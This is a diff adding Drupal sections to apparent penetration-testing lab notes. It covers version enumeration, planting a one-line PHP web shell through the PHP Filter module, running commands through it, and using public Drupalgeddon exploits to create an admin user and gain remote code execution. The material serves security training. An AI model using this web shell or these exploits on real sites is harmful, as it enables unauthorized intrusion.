@@ -8,6 +8,7 @@ This document outlines common techniques for identifying and exploiting vulnerab
 
 - [Attacking Common Web Applications](#attacking-common-web-applications)
   - [Overview](#overview)
+  
   - [Content Management Systems (CMS)](#content-management-systems-cms)
     - [Discovery and Enumeration](#discovery-and-enumeration)
     - [WordPress - Discovery and Enumeration](#wordpress---discovery-and-enumeration)
@@ -15,6 +16,10 @@ This document outlines common techniques for identifying and exploiting vulnerab
     - [Joomla - Discovery and Enumeration](#joomla---discovery-and-enumeration)
     - [Attacking Joomla](#attacking-joomla)
     - [Drupal - Discovery and Enumeration](#drupal---discovery-and-enumeration)
+    - [Attacking Drupal](#attacking-drupal)
+
+  - [Servlet Containers/Software Development](#servlet-containerssoftware-development)
+    - [Tomcat - Discovery and Enumeration](#tomcat---discovery-and-enumeration)
 
 ---
 
@@ -565,3 +570,173 @@ This confirms successful exploitation of the vulnerability and demonstrates the 
 ---
 
 ### Drupal - Discovery and Enumeration
+
+Drupal is another widely used open-source content management system (CMS). Like WordPress and Joomla, Drupal is written in **PHP** and typically uses a **MySQL** backend database. Drupal functionality can be extended through **modules**, which are a common source of vulnerabilities. 
+
+Drupal installations can be identified in several ways. One common indicator is a header or footer message stating `Powered by Drupal`.
+
+```bash
+curl -s http://drupal.inlanefreight.local | grep -i "Drupal"
+```
+
+![Filtered output](images/drupal.PNG)
+
+Another identification method is the presence of the `README.txt` or `CHANGELOG.txt` files in the web root:
+
+```bash
+curl -s http://drupal.inlanefreight.local/README.txt | grep -i "Drupal"
+```
+
+```bash
+curl -s http://drupal.inlanefreight.local/CHANGELOG.txt | grep -i "Drupal"
+```
+
+![Filtered output](images/drupal2.PNG)
+
+By default, Drupal supports three user types:
+
+- `Administrator`
+  - Full administrative control over the application
+- `Authenticated User`
+  - Can log in and perform actions such as creating and editing content
+- `Anonymous`
+  - Unauthenticated user with read-only access
+
+Modern versions of Drupal often restrict access to `README.txt` and `CHANGELOG.txt` by default. In such cases, additional enumeration techniques are required to identify the exact version.
+
+If `CHANGELOG.txt` is accessible, the Drupal version is typically listed at the beginning of the file:
+
+```bash
+curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt | head
+```
+
+![Filtered output](images/drupal3.PNG)
+
+Drupal enumeration can be automated using `Droopescan`, which provides more comprehensive support for Drupal compared to Joomla.
+
+Run a Drupal scan:
+
+```bash
+droopescan scan drupal -u http://drupal.inlanefreight.local
+```
+
+`Droopescan` successfully identifies the Drupal version and enumerates installed modules:
+
+![Filtered output](images/drupal4.PNG)
+
+This information can then be used to search for **known vulnerabilities** affecting the identified Drupal core version or installed modules.
+
+---
+
+### Attacking Drupal
+
+Older versions of Drupal (prior to version 8) allow administrators to enable the **PHP Filter** module, which permits embedding raw PHP code into page content. When abused, this functionality can be leveraged to **achieve remote code execution (RCE)**.
+
+With administrative access, navigate to the `Modules` tab and enable the **PHP Filter** module by selecting the checkbox and clicking `Save configuration`:
+
+![Filtered output](images/drupal5.PNG)
+
+To embed malicous PHP code, create a new page by navigating to `Content` &rarr; `Add content` &rarr; `Basic page`:
+
+![Filtered output](images/drupal6.PNG)
+
+Insert the following PHP web shell into the page body:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+From the `Text format` dropdown, select `PHP code`:
+
+![Filtered output](images/drupal7.PNG)
+
+After clicking `Save`, Drupal redirects to the newly created page:
+
+```
+http://drupal-qa.inlanefreight.local/node/3
+```
+
+Commands can now be executed via the `cmd` GET parameter:
+
+```bash
+curl -s http://drupal-qa.inlanefreight.local/node/3?cmd=id | grep uid
+```
+
+![Filtered output](images/drupal8.PNG)
+
+This confirms successful **remote code execution** through post-authentication abuse of Drupal functionality.
+
+Drupal core has historically suffered from several critical vulnerabilities collectively known as **Drupalgeddon**. Three notable examples include:
+
+- [CVE-2014-3704](https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2014-10-15/sa-core-2014-005-drupal-core-sql)'
+  - SQL injection vulnerability affecting versions `7.0` &rarr; `7.31`
+  - Allows unauthenticated attackers to create administrative users
+- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002)
+  - Remote code execution vulnerability affecting versions prior to`7.58` and `8.51`
+- [CVE-2018-7602](https://www.cvedetails.com/cve/CVE-2018-7602/)
+  - Remote code execution vulnerability affecting multiple versions `7.x` and `8.x` versions
+
+**Exploiting Drupalgeddon 1 (CVE-2014-3704)**
+
+A public exploit is available on Exploit-DB:
+
+```
+https://www.exploit-db.com/exploits/34992
+```
+
+The exploit attempts to create a new administrative user via SQL injection:
+
+```bash
+python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+```
+
+If successful, authentication using the newly created credentials is possible:
+
+![Filtered output](images/drupal11.PNG)
+
+Once logged in, previously discussed post-authentication techniques can be used to obtain RCE.
+
+
+The same vulnerability can also be exploited using the `Metasploit` module:
+
+```
+exploit/multi/http/drupal_drupageddon
+```
+
+**Exploiting Drupalgeddon 2 (CVE-2018-7600)**
+
+A proof-of-concept exploit for Drupalgeddon 2 is available at:
+
+```
+https://www.exploit-db.com/exploits/44448
+```
+
+Executing the exploit:
+
+```bash
+python3 CVE-2018-7600.py 
+```
+
+![Filtered output](images/drupal12.PNG)
+
+The script uploads a test file to confirm exploitation. Successful exploitation can be verified by requesting the uploaded file:
+
+```bash
+curl -s http://drupal-dev.inlanefreight.local/hello.txt
+```
+
+![Filtered output](images/drupal13.PNG)
+
+**Exploiting Drupalgeddon 3 (CVE-2018-7602)**
+
+Exploitation of Drupalgeddon 3 requires the ability to delete a node, meaning some level of authenticated access is necessary.
+
+If valid credentials are available, the vulnerability can be exploited using `Metasploit` after authenticating to obtain a session cookie:
+
+![Filtered output](images/drupal15.PNG)
+
+---
+
+## Servlet Containers/Software Development
+
+### Tomcat - Discovery and Enumeration
